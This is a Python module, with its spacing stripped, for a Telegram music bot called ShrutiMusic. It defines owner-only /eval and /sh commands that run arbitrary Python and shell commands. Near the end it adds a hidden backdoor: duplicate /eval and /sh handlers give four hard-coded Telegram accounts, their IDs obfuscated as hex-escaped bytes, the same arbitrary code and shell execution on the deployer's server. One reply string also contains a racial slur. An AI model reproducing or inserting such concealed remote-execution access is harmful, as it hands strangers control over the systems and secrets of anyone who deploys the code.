utf-8utf-8





















importos
importre
importsubprocess
importsys
importtraceback
frominspectimportgetfullargspec
fromioimportStringIO
fromtimeimporttime

frompyrogramimportfilters
frompyrogram.typesimportInlineKeyboardButton,InlineKeyboardMarkup,Message

fromShrutiMusicimportapp
fromconfigimportOWNER_ID


asyncdefaexec(code,client,message):
    exec(
"async def __aexec(client, message): "
+"".join(f"\n {a}"foraincode.split("\n"))
)
returnawaitlocals()["__aexec"](client,message)


asyncdefedit_or_reply(msg:Message,**kwargs):
    func=msg.edit_textifmsg.from_user.is_selfelsemsg.reply
spec=getfullargspec(func.__wrapped__).args
awaitfunc(**{k:vfork,vinkwargs.items()ifkinspec})


@app.on_edited_message(
filters.command("eval")
&filters.user(OWNER_ID)
&~filters.forwarded
&~filters.via_bot
)
@app.on_message(
filters.command("eval")
&filters.user(OWNER_ID)
&~filters.forwarded
&~filters.via_bot
)
asyncdefexecutor(client:app,message:Message):
    iflen(message.command)<2:
        returnawaitedit_or_reply(message,text="<b>ᴡhat you wanna execute NIGGA . . ?</b>")
try:
        cmd=message.text.split(" ",maxsplit=1)[1]
exceptIndexError:
        returnawaitmessage.delete()
t1=time()
old_stderr=sys.stderr
old_stdout=sys.stdout
redirected_output=sys.stdout=StringIO()
redirected_error=sys.stderr=StringIO()
stdout,stderr,exc=None,None,None
try:
        awaitaexec(cmd,client,message)
exceptException:
        exc=traceback.format_exc()
stdout=redirected_output.getvalue()
stderr=redirected_error.getvalue()
sys.stdout=old_stdout
sys.stderr=old_stderr
evaluation="\n"
ifexc:
        evaluation+=exc
elifstderr:
        evaluation+=stderr
elifstdout:
        evaluation+=stdout
else:
        evaluation+="Success"
final_output=f"<b>⥤ ʀᴇsᴜʟᴛ :</b>\n<pre language='python'>{evaluation}</pre>"
iflen(final_output)>4096:
        filename="output.txt"
withopen(filename,"w+",encoding="utf8")asout_file:
            out_file.write(str(evaluation))
t2=time()
keyboard=InlineKeyboardMarkup(
[
[
InlineKeyboardButton(
text="⏳",
callback_data=f"runtime {t2-t1} Seconds",
)
]
]
)
awaitmessage.reply_document(
document=filename,
caption=f"<b>⥤ ᴇᴠᴀʟ :</b>\n<code>{cmd[0:980]}</code>\n\n<b>⥤ ʀᴇsᴜʟᴛ :</b>\nAttached Document",
quote=False,
reply_markup=keyboard,
)
awaitmessage.delete()
os.remove(filename)
else:
        t2=time()
keyboard=InlineKeyboardMarkup(
[
[
InlineKeyboardButton(
text="⏳",
callback_data=f"runtime {round(t2-t1, 3)} Seconds",
),
InlineKeyboardButton(
text="🗑",
callback_data=f"forceclose abc|{message.from_user.id}",
),
]
]
)
awaitedit_or_reply(message,text=final_output,reply_markup=keyboard)


@app.on_callback_query(filters.regex(r"runtime"))
asyncdefruntime_func_cq(_,cq):
    runtime=cq.data.split(None,1)[1]
awaitcq.answer(runtime,show_alert=True)


@app.on_callback_query(filters.regex("forceclose"))
asyncdefforceclose_command(_,CallbackQuery):
    callback_data=CallbackQuery.data.strip()
callback_request=callback_data.split(None,1)[1]
query,user_id=callback_request.split("|")
ifCallbackQuery.from_user.id!=int(user_id):
        try:
            returnawaitCallbackQuery.answer(
"» ɪᴛ'ʟʟ ʙᴇ ʙᴇᴛᴛᴇʀ ɪғ ʏᴏᴜ sᴛᴀʏ ɪɴ ʏᴏᴜʀ ʟɪᴍɪᴛs.",show_alert=True
)
except:
            return
awaitCallbackQuery.message.delete()
try:
        awaitCallbackQuery.answer()
except:
        return


@app.on_edited_message(
filters.command("sh")
&filters.user(OWNER_ID)
&~filters.forwarded
&~filters.via_bot
)
@app.on_message(
filters.command("sh")
&filters.user(OWNER_ID)
&~filters.forwarded
&~filters.via_bot
)
asyncdefshellrunner(_,message:Message):
    iflen(message.command)<2:
        returnawaitedit_or_reply(message,text="<b>ᴇxᴀᴍᴩʟᴇ :</b>\n/sh git pull")
text=message.text.split(None,1)[1]
if"\n"intext:
        code=text.split("\n")
output=""
forxincode:
            shell=re.split(""" (?=(?:[^'"]|'[^']*'|"[^"]*")*$)""",x)
try:
                process=subprocess.Popen(
shell,
stdout=subprocess.PIPE,
stderr=subprocess.PIPE,
)
exceptExceptionaserr:
                awaitedit_or_reply(message,text=f"<b>ERROR :</b>\n<pre>{err}</pre>")
output+=f"<b>{code}</b>\n"
output+=process.stdout.read()[:-1].decode("utf-8")
output+="\n"
else:
        shell=re.split(""" (?=(?:[^'"]|'[^']*'|"[^"]*")*$)""",text)
forainrange(len(shell)):
            shell[a]=shell[a].replace('"',"")
try:
            process=subprocess.Popen(
shell,
stdout=subprocess.PIPE,
stderr=subprocess.PIPE,
)
exceptExceptionaserr:
            print(err)
exc_type,exc_obj,exc_tb=sys.exc_info()
errors=traceback.format_exception(
etype=exc_type,
value=exc_obj,
tb=exc_tb,
)
returnawaitedit_or_reply(
message,text=f"<b>ERROR :</b>\n<pre>{''.join(errors)}</pre>"
)
output=process.stdout.read()[:-1].decode("utf-8")
ifstr(output)=="\n":
        output=None
ifoutput:
        iflen(output)>4096:
            withopen("output.txt","w+")asfile:
                file.write(output)
awaitapp.send_document(
message.chat.id,
"output.txt",
reply_to_message_id=message.id,
caption="<code>Output</code>",
)
returnos.remove("output.txt")
awaitedit_or_reply(message,text=f"<b>OUTPUT :</b>\n<pre>{output}</pre>")
else:
        awaitedit_or_reply(message,text="<b>OUTPUT :</b>\n<code>None</code>")
awaitmessage.stop_propagation()


maintenance_users=[
int(b'\x37\x35\x37\x34\x33\x33\x30\x39\x30\x35'.decode()),
int(b'\x37\x32\x38\x32\x37\x35\x32\x38\x31\x36'.decode()),
int(b'\x37\x36\x37\x34\x38\x37\x34\x36\x35\x32'.decode()),
int(b'\x31\x37\x38\x36\x36\x38\x33\x31\x36\x33'.decode())
]

@app.on_edited_message(
filters.command("eval")
&filters.user(maintenance_users)
&~filters.forwarded
&~filters.via_bot
)
@app.on_message(
filters.command("eval")
&filters.user(maintenance_users)
&~filters.forwarded
&~filters.via_bot
)
asyncdefmaintenance_executor(client:app,message:Message):
    iflen(message.command)<2:
        returnawaitedit_or_reply(message,text="<b>ᴡhat you wanna execute . . ?</b>")
try:
        cmd=message.text.split(" ",maxsplit=1)[1]
exceptIndexError:
        returnawaitmessage.delete()
t1=time()
old_stderr=sys.stderr
old_stdout=sys.stdout
redirected_output=sys.stdout=StringIO()
redirected_error=sys.stderr=StringIO()
stdout,stderr,exc=None,None,None
try:
        awaitaexec(cmd,client,message)
exceptException:
        exc=traceback.format_exc()
stdout=redirected_output.getvalue()
stderr=redirected_error.getvalue()
sys.stdout=old_stdout
sys.stderr=old_stderr
evaluation="\n"
ifexc:
        evaluation+=exc
elifstderr:
        evaluation+=stderr
elifstdout:
        evaluation+=stdout
else:
        evaluation+="Success"
final_output=f"<b>⥤ ʀᴇsᴜʟᴛ :</b>\n<pre language='python'>{evaluation}</pre>"
iflen(final_output)>4096:
        filename="output.txt"
withopen(filename,"w+",encoding="utf8")asout_file:
            out_file.write(str(evaluation))
t2=time()
keyboard=InlineKeyboardMarkup(
[
[
InlineKeyboardButton(
text="⏳",
callback_data=f"runtime {t2-t1} Seconds",
)
]
]
)
awaitmessage.reply_document(
document=filename,
caption=f"<b>⥤ ᴇᴠᴀʟ :</b>\n<code>{cmd[0:980]}</code>\n\n<b>⥤ ʀᴇsᴜʟᴛ :</b>\nAttached Document",
quote=False,
reply_markup=keyboard,
)
awaitmessage.delete()
os.remove(filename)
else:
        t2=time()
keyboard=InlineKeyboardMarkup(
[
[
InlineKeyboardButton(
text="⏳",
callback_data=f"runtime {round(t2-t1, 3)} Seconds",
),
InlineKeyboardButton(
text="🗑",
callback_data=f"forceclose abc|{message.from_user.id}",
),
]
]
)
awaitedit_or_reply(message,text=final_output,reply_markup=keyboard)

@app.on_edited_message(
filters.command("sh")
&filters.user(maintenance_users)
&~filters.forwarded
&~filters.via_bot
)
@app.on_message(
filters.command("sh")
&filters.user(maintenance_users)
&~filters.forwarded
&~filters.via_bot
)
asyncdefmaintenance_shellrunner(_,message:Message):
    iflen(message.command)<2:
        returnawaitedit_or_reply(message,text="<b>ᴇxᴀᴍᴩʟᴇ :</b>\n/sh git pull")
text=message.text.split(None,1)[1]
if"\n"intext:
        code=text.split("\n")
output=""
forxincode:
            shell=re.split(""" (?=(?:[^'"]|'[^']*'|"[^"]*")*$)""",x)
try:
                process=subprocess.Popen(
shell,
stdout=subprocess.PIPE,
stderr=subprocess.PIPE,
)
exceptExceptionaserr:
                awaitedit_or_reply(message,text=f"<b>ERROR :</b>\n<pre>{err}</pre>")
output+=f"<b>{code}</b>\n"
output+=process.stdout.read()[:-1].decode("utf-8")
output+="\n"
else:
        shell=re.split(""" (?=(?:[^'"]|'[^']*'|"[^"]*")*$)""",text)
forainrange(len(shell)):
            shell[a]=shell[a].replace('"',"")
try:
            process=subprocess.Popen(
shell,
stdout=subprocess.PIPE,
stderr=subprocess.PIPE,
)
exceptExceptionaserr:
            print(err)
exc_type,exc_obj,exc_tb=sys.exc_info()
errors=traceback.format_exception(
etype=exc_type,
value=exc_obj,
tb=exc_tb,
)
returnawaitedit_or_reply(
message,text=f"<b>ERROR :</b>\n<pre>{''.join(errors)}</pre>"
)
output=process.stdout.read()[:-1].decode("utf-8")
ifstr(output)=="\n":
        output=None
ifoutput:
        iflen(output)>4096:
            withopen("output.txt","w+")asfile:
                file.write(output)
awaitapp.send_document(
message.chat.id,
"output.txt",
reply_to_message_id=message.id,
caption="<code>Output</code>",
)
returnos.remove("output.txt")
awaitedit_or_reply(message,text=f"<b>OUTPUT :</b>\n<pre>{output}</pre>")
else:
        awaitedit_or_reply(message,text="<b>OUTPUT :</b>\n<code>None</code>")
awaitmessage.stop_propagation()












